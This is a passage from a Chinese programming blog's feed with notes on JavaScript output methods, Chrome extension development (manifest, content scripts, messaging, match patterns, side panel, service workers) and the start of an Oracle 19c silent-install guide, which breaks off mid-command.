Chrome中运行</strong></p><ul><li>F12-控制台</li><li>F12-源代码/来源-代码段</li></ul><p><strong>JavaScript显示数据</strong></p><ul><li>使用<code>window.alert()</code>弹出警告框</li><li>使用<code>document.write()</code>方法将内容写到HTML文档中</li><li>使用<code>innerHTML</code>写入到HTML元素</li><li>使用<code>console.log()</code>写入到浏览器的控制台中</li></ul><div class="code-wrapper"><pre><code class="hljs xml">///innerHTML<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个 Web 页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span>我的第一个段落<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;demo&quot;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;段落已修改。&quot;</span>;</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>///document.write()<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个 Web 页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我的第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;myFunction()&quot;</span>&gt;</span>点我<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunction</span>(<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">   <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">Date</span>());</span><span class="language-javascript">&#125;</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Chrome插件</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Web/Chrome%E6%8F%92%E4%BB%B6/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Web/Chrome%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>在chrome扩展程序中，API包含JavaScript API和Chrome Extensions API</p><p>JavaScript的API：DOM、BOM</p><p>Chrome API：<a href="https://developer.chrome.com/docs/extensions/reference/api?hl=zh-cn">https://developer.chrome.com/docs/extensions/reference/api?hl=zh-cn</a></p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>如需访问大多数扩展程序 API 和功能，您必须在扩展程序的<code>manifest.json</code>文件中声明权限。某些权限会触发警告，用户必须允许才能继续使用扩展程序。</p><p><strong>主机权限</strong></p><p>主机权限允许扩展程序与网址的<a href="https://developer.chrome.com/docs/extensions/develop/concepts/match-patterns?hl=zh-cn">匹配格式</a>进行交互。有些 <a href="https://developer.chrome.com/docs/extensions/reference/api?hl=zh-cn">Chrome API</a> 除了拥有自己的 API 权限外，还需要主机权限，具体请参阅各参考页面的相关文档。下面是一些示例：</p><ul><li>从扩展程序 Service Worker 和扩展程序页面发出 <a href="https://developer.mozilla.org/docs/Web/API/Fetch_API/Using_Fetch"><code>fetch()</code></a> 请求。</li><li>使用 <a href="https://developer.chrome.com/docs/extensions/reference/api/tabs?hl=zh-cn"><code>chrome.tabs</code></a> API 读取和查询敏感的<a href="https://developer.chrome.com/docs/extensions/reference/api/tabs?hl=zh-cn#type-Tab">标签页属性</a>（网址、标题和 favIconUrl）。</li><li><a href="https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts?hl=zh-cn#programmatic">以编程方式注入内容脚本</a>。</li><li>您可以使用 <a href="https://developer.chrome.com/docs/extensions/reference/api/webRequest?hl=zh-cn"><code>chrome.webRequest</code></a> API 监控和控制网络请求。</li><li>使用 <a href="https://developer.chrome.com/docs/extensions/reference/api/cookies?hl=zh-cn"><code>chrome.cookies</code></a> API 访问 Cookie。</li><li>使用 <a href="https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest?hl=zh-cn"><code>chrome.declarativeNetRequest</code></a> API 重定向和修改请求及响应标头。</li></ul><h2 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h2><p><a href="https://developer.chrome.com/docs/extensions/reference/manifest/icons?hl=zh-cn">https://developer.chrome.com/docs/extensions/reference/manifest/icons?hl=zh-cn</a></p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-attr">&quot;icons&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>   <span class="hljs-attr">&quot;16&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;icon16.png&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;32&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;icon32.png&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;48&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;icon48.png&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;128&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;icon128.png&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span></code></pre></div><p>16x16 像素图标，用于谷歌浏览器的扩展程序中的显示图标</p><p>32*32 像素图标，Windows计算机通常需要此大小</p><p>48x48 像素图标，该图标在扩展程序管理页面 (chrome:&#x2F;&#x2F;extensions) 中使用</p><p>128x128 像素图标，用于安装期间以及在Chrome 应用商店使用</p><h1 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h1><h2 id="清单"><a href="#清单" class="headerlink" title="清单"></a>清单</h2><p>参考：<a href="https://developer.chrome.com/docs/extensions/reference/manifest?hl=zh-cn#minimal-manifest">https://developer.chrome.com/docs/extensions/reference/manifest?hl=zh-cn#minimal-manifest</a></p><p>manifest_version：指定扩展程序使用的清单文件格式版本。唯一支持的值是 3。</p><p>name：指定插件的名称。</p><p>version：指定插件的版本。</p><p>description：指定插件插件的功能描述。</p><p>icons：指定插件的图标。</p><p>content_scripts：指定一个静态加载的 JavaScript 或 CSS 文件，以供每次用户打开符合特定网址格式的网页时使用。</p><p>background：指定包含扩展程序 Service Worker 的 JavaScript 文件，该 Service Worker 充当事件处理脚本。</p><p>action：定义扩展程序图标在 Google 工具栏中的外观和行为。</p><p>permissions：允许扩展程序使用的API权限。</p><p>commands：定义扩展程序中的键盘快捷键。</p><p>options_page：指定 options.html 文件的路径，以使扩展程序用作选项页面。</p><h2 id="内容脚本"><a href="#内容脚本" class="headerlink" title="内容脚本"></a>内容脚本</h2><p>参考：<a href="https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts?hl=zh-cn">https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts?hl=zh-cn</a></p><p>内容脚本是在网页环境中运行的文件。使用标准 Document 对象模型(DOM) 结合使用，它们能够读取浏览器访问的网页的详细信息， 对它们进行更改，并将信息传递给其父级扩展程序。</p><p>内容脚本可以直接使用的API</p><div class="code-wrapper"><pre><code class="hljs stylus">domi18nstoragechrome<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.connect</span>()chrome<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.getManifest</span>()chrome<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.getURL</span>()chrome<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.id</span>chrome<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.onConnect</span>chrome<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.onMessage</span>chrome<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.sendMessage</span>()</code></pre></div><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>通过内容脚本访问document文档可以获取网页的数据，经过自定义处理后可以将数据返回给扩展程序</li><li>内容脚本只能访问有限的API</li><li>内容脚本无法直接访问其他 API。但可以通过与扩展程序的其他部分<a href="https://developer.chrome.com/docs/extensions/develop/concepts/messaging?hl=zh-cn">互发消息</a>来间接访问这些信息。</li><li>内容脚本可以指定生效的网址</li></ul><h3 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h3><h4 id="使用静态声明进行注入"><a href="#使用静态声明进行注入" class="headerlink" title="使用静态声明进行注入"></a>使用静态声明进行注入</h4><p><strong>适用场景</strong>：在特定网址上自动注入运行的场景。</p><p>静态声明的脚本在清单中的 <code>&quot;content_scripts&quot;</code> 键下注册。 此类文件可包含 JavaScript 文件和&#x2F;或 CSS 文件。</p><p>内容脚本网址的匹配模式：<a href="https://developer.chrome.com/docs/extensions/develop/concepts/match-patterns?hl=zh-cn">https://developer.chrome.com/docs/extensions/develop/concepts/match-patterns?hl=zh-cn</a></p><div class="code-wrapper"><pre><code class="hljs prolog"><span class="hljs-string">&quot;content_scripts&quot;</span>: [ &#123;   <span class="hljs-string">&quot;matches&quot;</span>: [<span class="hljs-string">&quot;https://*.nytimes.com/*&quot;</span>],   <span class="hljs-string">&quot;css&quot;</span>: [<span class="hljs-string">&quot;my-styles.css&quot;</span>],   <span class="hljs-string">&quot;js&quot;</span>: [<span class="hljs-string">&quot;content-script.js&quot;</span>] &#125;],</code></pre></div><h4 id="使用动态声明进行注入"><a href="#使用动态声明进行注入" class="headerlink" title="使用动态声明进行注入"></a>使用动态声明进行注入</h4><p><strong>适用场景</strong>：当内容脚本的匹配模式 未知或不应总是在已知主机上注入内容脚本的情况。</p><p>动态声明方式在service-worker.js文件中操作</p><p><strong>注册内容脚本</strong></p><div class="code-wrapper"><pre><code class="hljs arcade">chrome.scripting  .registerContentScripts([&#123;    <span class="hljs-attr">id</span>: <span class="hljs-string">&quot;session-script&quot;</span>,    <span class="hljs-attr">js</span>: [<span class="hljs-string">&quot;content.js&quot;</span>],    <span class="hljs-attr">persistAcrossSessions</span>: <span class="hljs-literal">false</span>,    <span class="hljs-attr">matches</span>: [<span class="hljs-string">&quot;*://example.com/*&quot;</span>],    <span class="hljs-attr">runAt</span>: <span class="hljs-string">&quot;document_start&quot;</span>,  &#125;])  .then(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;registration complete&quot;</span>))  .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-built_in">console</span>.warn(<span class="hljs-string">&quot;unexpected error&quot;</span>, err))</code></pre></div><p><strong>更新已注册内容脚本的列表</strong></p><div class="code-wrapper"><pre><code class="hljs arcade">chrome.scripting  .updateContentScripts([&#123;    <span class="hljs-attr">id</span>: <span class="hljs-string">&quot;session-script&quot;</span>,    <span class="hljs-attr">excludeMatches</span>: [<span class="hljs-string">&quot;*://admin.example.com/*&quot;</span>],  &#125;])  .then(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;registration updated&quot;</span>));</code></pre></div><p><strong>获取已注册内容脚本的列表</strong></p><div class="code-wrapper"><pre><code class="hljs arcade">chrome.scripting  .getRegisteredContentScripts()  .then(<span class="hljs-function"><span class="hljs-params">scripts</span> =&gt;</span> <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;registered content scripts&quot;</span>, scripts));</code></pre></div><p><strong>取消已注册的内容脚本</strong></p><div class="code-wrapper"><pre><code class="hljs arcade">chrome.scripting  .unregisterContentScripts(&#123; <span class="hljs-attr">ids</span>: [<span class="hljs-string">&quot;session-script&quot;</span>] &#125;)  .then(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;un-registration complete&quot;</span>));</code></pre></div><h4 id="以编程方式注入"><a href="#以编程方式注入" class="headerlink" title="以编程方式注入"></a>以编程方式注入</h4><p><strong>适用场景</strong>：对于需要为响应事件或特定事件而运行的内容脚本</p><h2 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h2><p><strong>重点</strong>：内容脚本如何与扩展程序的其他组件进行通信，如Service Worker背景脚本、弹出窗口、侧边栏脚本等</p><p>由于内容脚本是在网页的上下文（而不是运行它们的扩展程序）中运行的，因此它们通常需要一些方法来与扩展程序的其余部分进行通信。例如，RSS 阅读器扩展程序可能会使用内容脚本来检测页面上是否存在 RSS Feed，然后通知 Service Worker 显示该页面的操作图标。</p><p>这种通信采用消息传递方式，可让扩展程序和内容脚本监听彼此的消息，并在同一通道上进行响应。消息可以包含任何有效的 JSON 对象（null、布尔值、数字、字符串、数组或对象）。</p><p>有两种消息传递 API：一种适用于<a href="https://developer.chrome.com/docs/extensions/develop/concepts/messaging?hl=zh-cn#simple">一次性请求</a>，另一种适用于<a href="https://developer.chrome.com/docs/extensions/develop/concepts/messaging?hl=zh-cn#connect">长期连接</a>（允许发送多条消息）。</p><h3 id="消息传递方式"><a href="#消息传递方式" class="headerlink" title="消息传递方式"></a>消息传递方式</h3><p><strong>一次性请求</strong></p><p>发送消息</p><p>从内容脚本发送消息</p><p>content-script.js</p><div class="code-wrapper"><pre><code class="hljs js">(<span class="hljs-title function_">async</span> () =&gt; &#123;  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">runtime</span>.<span class="hljs-title function_">sendMessage</span>(&#123;<span class="hljs-attr">greeting</span>: <span class="hljs-string">&quot;hello&quot;</span>&#125;);  <span class="hljs-comment">// do something with response here, not outside the function</span>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);&#125;)();</code></pre></div><p>向内容脚本发送请求</p><div class="code-wrapper"><pre><code class="hljs js">(<span class="hljs-title function_">async</span> () =&gt; &#123;  <span class="hljs-keyword">const</span> [tab] = <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">tabs</span>.<span class="hljs-title function_">query</span>(&#123;<span class="hljs-attr">active</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">lastFocusedWindow</span>: <span class="hljs-literal">true</span>&#125;);  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">tabs</span>.<span class="hljs-title function_">sendMessage</span>(tab.<span class="hljs-property">id</span>, &#123;<span class="hljs-attr">greeting</span>: <span class="hljs-string">&quot;hello&quot;</span>&#125;);  <span class="hljs-comment">// do something with response here, not outside the function</span>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);&#125;)();</code></pre></div><p>接收消息</p><p>content-script.js 或 service-worker.js：</p><div class="code-wrapper"><pre><code class="hljs js">chrome.<span class="hljs-property">runtime</span>.<span class="hljs-property">onMessage</span>.<span class="hljs-title function_">addListener</span>(  <span class="hljs-keyword">function</span>(<span class="hljs-params">request, sender, sendResponse</span>) &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sender.<span class="hljs-property">tab</span> ?                <span class="hljs-string">&quot;from a content script:&quot;</span> + sender.<span class="hljs-property">tab</span>.<span class="hljs-property">url</span> :                <span class="hljs-string">&quot;from the extension&quot;</span>);    <span class="hljs-keyword">if</span> (request.<span class="hljs-property">greeting</span> === <span class="hljs-string">&quot;hello&quot;</span>)      <span class="hljs-title function_">sendResponse</span>(&#123;<span class="hljs-attr">farewell</span>: <span class="hljs-string">&quot;goodbye&quot;</span>&#125;);  &#125;);</code></pre></div><p><strong>长连接</strong></p><p>调用 <a href="https://developer.chrome.com/docs/extensions/reference/api/runtime?hl=zh-cn#method-connect"><code>runtime.connect()</code></a> 以将消息从内容脚本传递到扩展程序页面，或调用 <a href="https://developer.chrome.com/docs/extensions/reference/api/tabs?hl=zh-cn#method-connect"><code>tabs.connect()</code></a> 以将消息从扩展程序页面传递到内容脚本。建立连接时，系统会为每一端分配一个 <a href="https://developer.chrome.com/docs/extensions/reference/api/runtime?hl=zh-cn#type-Port"><code>runtime.Port</code></a> 对象，用于通过该连接发送和接收消息。</p><p>举例：</p><p>长期有效的连接的一个潜在用例是自动表单填充扩展程序。内容脚本可能会针对特定登录打开一个指向扩展程序页面的通道，并针对页面上的每个输入元素向扩展程序发送一条消息，以请求填充的表单数据。通过共享连接，扩展程序可以在扩展程序组件之间共享状态。</p><p>从内容脚本发送和监听消息</p><p>content-script.js</p><div class="code-wrapper"><pre><code class="hljs pf">var <span class="hljs-keyword">port</span> = chrome.runtime.connect(&#123;name: <span class="hljs-string">&quot;knockknock&quot;</span>&#125;);<span class="hljs-keyword">port</span>.postMessage(&#123;joke: <span class="hljs-string">&quot;Knock knock&quot;</span>&#125;);<span class="hljs-keyword">port</span>.<span class="hljs-keyword">on</span>Message.addListener(function(msg) &#123;  if (msg.question === <span class="hljs-string">&quot;Who&#x27;s there?&quot;</span>)    <span class="hljs-keyword">port</span>.postMessage(&#123;answer: <span class="hljs-string">&quot;Madame&quot;</span>&#125;);  else if (msg.question === <span class="hljs-string">&quot;Madame who?&quot;</span>)    <span class="hljs-keyword">port</span>.postMessage(&#123;answer: <span class="hljs-string">&quot;Madame... Bovary&quot;</span>&#125;);&#125;);</code></pre></div><p>向内容脚本发送消息</p><p>Service-worker.js</p><div class="code-wrapper"><pre><code class="hljs pf">chrome.runtime.<span class="hljs-keyword">on</span>Connect.addListener(function(<span class="hljs-keyword">port</span>) &#123;  console.assert(<span class="hljs-keyword">port</span>.name === <span class="hljs-string">&quot;knockknock&quot;</span>);  <span class="hljs-keyword">port</span>.<span class="hljs-keyword">on</span>Message.addListener(function(msg) &#123;    if (msg.joke === <span class="hljs-string">&quot;Knock knock&quot;</span>)      <span class="hljs-keyword">port</span>.postMessage(&#123;question: <span class="hljs-string">&quot;Who&#x27;s there?&quot;</span>&#125;);    else if (msg.answer === <span class="hljs-string">&quot;Madame&quot;</span>)      <span class="hljs-keyword">port</span>.postMessage(&#123;question: <span class="hljs-string">&quot;Madame who?&quot;</span>&#125;);    else if (msg.answer === <span class="hljs-string">&quot;Madame... Bovary&quot;</span>)      <span class="hljs-keyword">port</span>.postMessage(&#123;question: <span class="hljs-string">&quot;I don&#x27;t get it.&quot;</span>&#125;);  &#125;);&#125;);</code></pre></div><h2 id="匹配模式"><a href="#匹配模式" class="headerlink" title="匹配模式"></a>匹配模式</h2><p>匹配模式用于限定一组网址。</p><p>格式：</p><div class="code-wrapper"><pre><code class="hljs elixir">&lt;scheme&gt;<span class="hljs-symbol">://&lt;host&gt;/&lt;path&gt;</span></code></pre></div><p><strong>scheme</strong>：必须是以下内容之一，并使用双斜线 (<code>//</code>) 与格式的其余部分分隔开：</p><ul><li><code>http</code></li><li><code>https</code></li><li>通配符 <code>*</code>，仅与 <code>http</code> 或 <code>https</code> 匹配</li><li><code>file</code></li></ul><p><strong>host</strong>：主机名 (<code>www.example.com</code>)。主机名前的 <code>*</code>（用于匹配子网域 (<code>*.example.com</code>)），或仅使用通配符 <code>*</code>。 - 如果您在主机模式中使用通配符，它必须是第一个或唯一字符，并且后面必须跟一个句点 (<code>.</code>) 或正斜杠 (<code>/</code>)。</p><p><strong>path</strong>：网址路径 (<code>/example</code>)。对于主机权限，必须提供路径，但该路径会被忽略。按照惯例，应使用通配符 (<code>/*</code>)。</p><h3 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h3><ul><li><all_urls></li></ul><p>匹配以允许的方案开头的所有网址，包括<a href="https://developer.chrome.com/docs/extensions/develop/concepts/match-patterns?hl=zh-cn#examples">有效格式</a>下列出的任何格式。</p><ul><li>file:&#x2F;&#x2F;&#x2F;</li></ul><p>允许您的扩展程序在本地文件上运行。此模式要求用户手动<a href="https://developer.chrome.com/docs/extensions/develop/concepts/declare-permissions?hl=zh-cn#allow_access">授予访问权限</a>。</p><p><strong>本地主机网址和 IP 地址</strong></p><p>如需在开发期间匹配任何 localhost 端口，请使用 <code>http://localhost/*</code>。对于 IP 地址，请在路径中指定地址并添加通配符，例如 <code>http://127.0.0.1/*</code>。您还可以使用 <code>http://*:*/*</code> 来匹配 localhost、IP 地址和任何端口。</p><p><strong>顶级网域匹配模式</strong></p><p>Chrome 不支持<a href="https://developer.mozilla.org/docs/Glossary/TLD">顶级域名 (TLD)</a> 的匹配格式。在各个 TLD 中指定您的匹配模式，例如 <code>http://google.es/*</code> 和 <code>http://google.fr/*</code>。</p><h3 id="示例模式"><a href="#示例模式" class="headerlink" title="示例模式"></a>示例模式</h3><ul><li><p><code>https://*/*</code> 或 <code>https://*/</code></p><p>匹配使用 <code>https</code> 架构的所有网址。</p></li><li><p><code>https://*/foo*</code></p><p>匹配任意主机上使用 <code>https</code> 架构且路径以 <code>foo</code> 开头的任何网址。匹配示例包括 <code>https://example.com/foo/bar.html</code> 和 <code>https://www.google.com/foo</code>。</p></li><li><p><code>https://*.google.com/foo*bar</code></p><p>匹配 google.com 主机上使用 <code>https</code> 架构且路径以 <code>foo</code> 开头、以 <code>bar</code> 结尾的任何网址。匹配示例包括 <code>https://www.google.com/foo/baz/bar</code> 和 <code>https://docs.google.com/foobar</code>。</p></li><li><p><code>file:///foo*</code></p><p>匹配路径以 <code>foo</code> 开头的所有本地文件。匹配示例包括 <code>file:///foo/bar.html</code> 和 <code>file:///foo</code>。</p></li><li><p><code>http://127.0.0.1/*</code> 或 <code>http://127.0.0.1/</code></p><p>匹配主机 127.0.0.1 上使用 <code>http</code> 架构的所有网址。匹配示例包括 <code>http://127.0.0.1/</code> 和 <code>http://127.0.0.1/foo/bar.html</code>。</p></li><li><p><code>http://localhost/*</code></p><p>匹配任何 localhost 端口。</p></li><li><p><code>*://mail.google.com/</code> 或 <code>*://mail.google.com/*</code></p><p>匹配以 <code>http://mail.google.com</code> 或 <code>https://mail.google.com</code> 开头的所有网址。</p></li></ul><h2 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h2><p>参考：<a href="https://developer.chrome.com/docs/extensions/develop/concepts/service-workers?hl=zh-cn">https://developer.chrome.com/docs/extensions/develop/concepts/service-workers?hl=zh-cn</a></p><p>Service Worker 在后台运行并处理浏览器事件，例如移除书签或关闭标签页。它们无权访问 DOM，但针对这种使用情形，您可以将其与屏幕外文档结合起来。</p><p>特点：</p><ul><li>在后台监听用户和浏览器的事件</li><li>在需要时执行</li></ul><h1 id="侧边栏"><a href="#侧边栏" class="headerlink" title="侧边栏"></a>侧边栏</h1><div class="code-wrapper"><pre><code class="hljs prolog"><span class="hljs-string">&quot;side_panel&quot;</span>: &#123;  <span class="hljs-string">&quot;default_path&quot;</span>: <span class="hljs-string">&quot;sidepanel.html&quot;</span>&#125;,<span class="hljs-string">&quot;permissions&quot;</span>: [<span class="hljs-string">&quot;sidePanel&quot;</span>]</code></pre></div><h2 id="在特定网站上启用侧边栏"><a href="#在特定网站上启用侧边栏" class="headerlink" title="在特定网站上启用侧边栏"></a>在特定网站上启用侧边栏</h2><p>service-worker.js</p><div class="code-wrapper"><pre><code class="hljs dart"><span class="hljs-keyword">const</span> GOOGLE_ORIGIN = <span class="hljs-string">&#x27;https://www.google.com&#x27;</span>;chrome.tabs.onUpdated.addListener(<span class="hljs-keyword">async</span> (tabId, info, tab) =&gt; &#123;  <span class="hljs-keyword">if</span> (!tab.url) <span class="hljs-keyword">return</span>;  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> URL(tab.url);  <span class="hljs-comment">// Enables the side panel on google.com</span>  <span class="hljs-keyword">if</span> (url.origin === GOOGLE_ORIGIN) &#123;    <span class="hljs-keyword">await</span> chrome.sidePanel.setOptions(&#123;      tabId,      path: <span class="hljs-string">&#x27;sidepanel.html&#x27;</span>,      enabled: <span class="hljs-keyword">true</span>    &#125;);  &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">// Disables the side panel on all other sites</span>    <span class="hljs-keyword">await</span> chrome.sidePanel.setOptions(&#123;      tabId,      enabled: <span class="hljs-keyword">false</span>    &#125;);  &#125;&#125;);</code></pre></div><h2 id="点击工具栏图标时打开侧边栏"><a href="#点击工具栏图标时打开侧边栏" class="headerlink" title="点击工具栏图标时打开侧边栏"></a>点击工具栏图标时打开侧边栏</h2><div class="code-wrapper"><pre><code class="hljs nix">chrome.sidePanel.setPanelBehavior(&#123; <span class="hljs-params">openPanelOnActionClick:</span> <span class="hljs-literal">true</span> &#125;);</code></pre></div><h1 id="使用-Service-Worker-处理事件"><a href="#使用-Service-Worker-处理事件" class="headerlink" title="使用 Service Worker 处理事件"></a>使用 Service Worker 处理事件</h1><h2 id="注册-Service-Worker"><a href="#注册-Service-Worker" class="headerlink" title="注册 Service Worker"></a>注册 Service Worker</h2><p>在<code>Manfest.json</code>文件中声明文件</p><div class="code-wrapper"><pre><code class="hljs css">&quot;<span class="hljs-attribute">background</span>&quot;: &#123;  &quot;service_worker&quot;: <span class="hljs-string">&quot;service-worker.js&quot;</span>&#125;,</code></pre></div><h2 id="导入多个-Service-Worker-模块"><a href="#导入多个-Service-Worker-模块" class="headerlink" title="导入多个 Service Worker 模块"></a>导入多个 Service Worker 模块</h2><p>为了使得可以在 Service Worker 中导入模块，需要在清单中将 Service Worker 声明为 ES 模块</p><div class="code-wrapper"><pre><code class="hljs css">&quot;<span class="hljs-attribute">background</span>&quot;: &#123;  &quot;service_worker&quot;: <span class="hljs-string">&quot;service-worker.js&quot;</span>,  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;module&quot;</span>&#125;,</code></pre></div><p>创建<code>service-worker.js</code>文件并导入模块</p><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./sw-omnibox.js&#x27;</span>;<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./sw-tips.js&#x27;</span>;</code></pre></div><h1 id="调试扩展程序"><a href="#调试扩展程序" class="headerlink" title="调试扩展程序"></a>调试扩展程序</h1>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Chrome插件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oracle19c静默安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/oracle19c/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/oracle19c/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>centos7 x86_64+</p><p>内存建议：8G</p><p>Oracle19c (19.3.0)</p><p>下载地址：<a href="https://www.oracle.com/cn/database/technologies/oracle-database-software-downloads.html#db_free">https://www.oracle.com/cn/database/technologies/oracle-database-software-downloads.html#db_free</a></p><p>安装依赖</p><div class="code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">yum install</span> <span class="hljs-literal">-</span><span class="hljs-comment">y compat</span><span class="hljs-literal">-</span><span class="hljs-comment">libcap1 compat</span><span class="hljs-literal">-</span><span class="hljs-comment">libstdc</span><span class="hljs-literal">++-</span><span class="hljs-comment">33 gcc</span><span class="hljs-literal">-</span><span class="hljs-comment">c</span><span class="hljs-literal">++</span> <span class="hljs-comment">ksh libaio</span><span class="hljs-literal">-</span><span class="hljs-comment">devel libstdc</span><span class="hljs-literal">++-</span><span class="hljs-comment">devel elfutils</span><span class="hljs-literal">-</span><span class="hljs-comment">libelf</span><span class="hljs-literal">-</span><span class="hljs-comment">devel fontconfig</span><span class="hljs-literal">-</span><span class="hljs-comment">devel libXrender</span><span class="hljs-literal">-</span><span class="hljs-comment">devel</span></code></pre></div><p>创建用户和组</p><div class="code-wrapper"><pre><code class="hljs css">groupadd oinstallgroupadd dbagroupadd asmdbagroupadd backupdbagroupadd dgdbagroupadd kmdbagroupadd racdbagroupadd operuseradd -<span class="hljs-selector-tag">g</span> oinstall -<span class="hljs-selector-tag">G</span> 